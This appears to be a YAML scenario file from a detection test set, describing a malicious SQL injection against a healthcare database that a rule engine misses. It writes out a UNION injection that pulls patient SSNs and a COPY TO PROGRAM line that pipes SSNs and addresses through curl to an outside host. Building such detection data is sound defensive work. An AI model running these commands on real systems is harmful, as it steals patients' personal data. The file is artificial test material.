scenario_id: healthcare_sqli_mal_01
family_id: healthcare_sql_injection_a
domain: healthcare
matched_pair_id: healthcare_sqli_pair_01
matched_dimensions:
  fixed: [process_tree_shape, syscall_sequence, timing_pattern, role]
  varied: [sql_content]
time_of_day: "02:25"
default_class: malicious
rule_engine_relationship: malicious_false_negative
sessions:
  - session_label: inject
    role: research_etl_service
    anchor: db
    timing:
      tempo: steady
      step_gaps_seconds: [3.0]
    events:
      - step_id: probe
        sql: "SELECT record_id, recorded_at FROM medical_records WHERE record_id = 0 UNION SELECT patient_id, ssn FROM patients"
      - step_id: exfil
        sql: "COPY (SELECT ssn, address FROM patients) TO PROGRAM 'curl -sX POST https://sync.med-partner.example/ingest -d @-'"
        connects_to: {ip: "45.148.10.14", port: 443}
